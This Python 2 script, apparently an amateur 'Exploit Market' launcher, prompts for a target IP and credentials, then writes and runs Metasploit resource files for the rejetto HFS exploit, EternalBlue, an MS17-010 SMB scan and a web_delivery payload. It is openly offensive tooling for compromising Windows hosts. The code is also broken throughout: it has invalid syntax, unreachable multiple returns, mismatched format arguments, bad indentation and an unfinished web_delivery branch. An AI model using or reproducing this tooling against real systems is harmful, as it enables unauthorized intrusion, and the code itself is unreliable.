# bin/python27
# Author: Abdul Aziz

"""Requirement: Must have Metasploit Framework Version: 4.14.28-dev or above installed."""

def rhostInfo():

	global targetPCusername
	global targetPCpassword
	global targetPCdomain

	targetPCusername = raw_input("Please Enter Your Target PC's Username: ")
	targetPCpassword = raw_input("Please Enter Your Target PC's Password: ")
	targetPCdomain = raw_input("Please Enter The Target PC's Domain Name: ")

	if custom_process_name, targetPCusername, targetPCpassword, targetPCdomain == 0:
		print("It Seems That You Do not have sufficient Information to Run This Exploit.\n Please")
		break

	else:

		return targetPCusername
		return targetPCpassword
		return targetPCdomain

def processName():

	global custom_process_name

	while True:
		global custom_process_name
		print("Please Note: Press Enter to Skip and Default 'spoolsv.exe' will be used! ")
		custom_process_name = raw_input("Please Enter A Custom Process Name: ")
		if len(custom_process_name) == 0:
			custom_process_name = "spoolsv.exe"

			if len(custom_process_name) < 4 or custom_process_name[-4:] == '.exe':
				print("Invalid Service Name or File Extension: '.exe'")

			return custom_process_name

def target_ip():
	while True:

		global target_ip_address
		target_ip_address = raw_input(' Please Enter the Target Ip Address: ')
		ip_dotCount = target_ip_address.count(".")

		if len(target_ip_address) <= 9 or ip_dotCount < 2:

			print("Alert: %s is not a valid ip address. Let's Try Again!" % (target_ip_address))

		else:
			return target_ip_address
def web_deliveryPreRequesties():

	global localIPaddr
	global localPort
	global srvhost
	global srvport

	localIPaddr = raw_input('Please Enter the Your Ip Address: ')
	print("Press Enter to Set (SRVPort: 80 & LPORT 4444) as Default.")
	localPort = int(input("Enter Your Connect Back Port: "))
	srvport = int(input("Please Enter Server Port: "))
	ip_dotCount = localIPaddr.count(".")

	if len(localIPaddr) <= 9 or ip_dotCount < 2:
		print("Please Enter Correct IP Address!")

	if localPort, srvport in range(0, 65535):
			print("Worked -- Passing..")
	if len(localPort) == 0 or len(srvport) == 0:
		localIPaddr = srvhost
		localPort = 4444
		srvport = 80

		return localIPaddr
		return localPort
		return srvhost
		return srvport

	else:
		print("Port Number is Invalid!")




def rejetto():
	file = open("tmp/rejetto.exploit", "w")
	file.write("""\
use exploit/windows/http/rejetto_hfs_exec
set RHOST %s
exploit
""" % (target_ip_address))

def eternalBlue():
	file = open("tmp/eternalBlue.exploit", "w")
	file.write("""\
use exploit/windows/smb/ms17_010_eternalblue
set RHOST %s
set ProcessName %s
exploit
""" % (target_ip_address, custom_process_name))

def smb_scan():
	file = open("tmp/smb_scan.exploit", "w")
	file.write("""\
use auxiliary/scanner/smb/smb_ms17_010
set RHOST %s
set SMBUser %s
set SMBPass %s
exploit
""" % (target_ip_address))

def web_delivery():
	file = open("tmp/web_delivery.exploit", "w")
	file.write("""\
use exploit/multi/script/web_delivery
set SRVHOST %s
set SRVPORT %s
set LHOST %s
set LPORT %s
set target 2
exploit
""" % (localIPaddr, localPort, srvhost, srvport))





def clearScreen():
	os.system('clear')

def welcomeBanner():
	clearScreen()

	print"""
	#-----------------------------------#
		WELCOME TO EXPLOIT MARKET!
			By: Abdul Aziz
	#-----------------------------------#

		 PRESS ENTER TO START

	"""
def exploitDescription():
		clearScreen()
		print"""
								  #---------------------------#
								  # ABDUL's FAV EXPLOITS LIST #
							   ####---------------------------####
							   # Github: abdu1aziz -- Abdul Aziz #
		-----------------------------------------------------------------------------------------------
		1. Type 'rejetto': hfs file server attack (2.3b and below are vulnrable).
		-----------------------------------------------------------------------------------------------
		2. Type 'eternalBlue': dll injection attack over smb server.
		-----------------------------------------------------------------------------------------------
		3. Type 'smb_scan': Scans target to view if vulnrable to Remote code Execution.
		-----------------------------------------------------------------------------------------------
		4. Type 'web_delivery': to generate a link to deliever payload wirelessly.(Memory Injection).
		-----------------------------------------------------------------------------------------------
		"""
		while True:

			choice = raw_input("Please Choose an Exploit By Name or Number: ")

			if choice == 1 or choice.lower() == 'rejetto':

				target_ip()
				rejetto()

				runHandler = raw_input("Would You like to run the Handler? Y/N").lower()
				if runHandler == 'y':
					clearScreen()
					print("Please Wait While We Get Things Up and Running!")
					os.system("sudo msfconsole -q -r tmp/rejetto.exploit")

				else:
					print("Your Handler 'rejetto.exploit' has been successfully created at: 'tmp/rejetto.exploit'")

			#------------------------------------------------------------------------------------------------------

			elif choice == 2 or choice.lower() == 'eternalBlue':
					target_ip()
					eternalBlue()

				runHandler = raw_input("Would You like to run the Handler? Y/N").lower()
				if runHandler == 'y':

					clearScreen()
					print("Please Wait While We Get Things Up and Running!")
					os.system("sudo msfconsole -q -r tmp/eternalBlue.exploit")

				else:
					print("Your Handler 'rejetto.exploit' has been successfully created at: 'tmp/rejetto.exploit'")

			#-------------------------------------------------------------------------------------------------------

			elif choice == 3 or choice.lower() == 'smb_scan':

				target_ip()
				rhostInfo()
				smb_scan()

				runHandler = raw_input("Would You like to run the Handler? Y/N").lower()
				if runHandler == 'y':

					clearScreen()
					print("Please Wait While We Get Things Up and Running!")
					os.system("sudo msfconsole -q -r tmp/smb_scan.exploit")

				else:
					print("Your Handler 'rejetto.exploit' has been successfully created at: 'tmp/rejetto.exploit'")

			elif choice == 4 or choice.lower() == 'web_delivery':
				pass
				''' ALL FUNCTIONS TO RUN!'''

				runHandler = raw_input("Would You like to run the Handler? Y/N").lower()
				if runHandler == 'y':

					''' RUN HANDLER HERE'''

					pass
				else:
					print("Your Handler 'rejetto.exploit' has been successfully created at: 'tmp/rejetto.exploit'")

def main():

	enterToStart = raw_input("")

	if len(enterToStart) == 0:
		os.system('clear && sudo msfdb init && clear')
		exploitDescription()

if __name__ == '__main__':
	main()
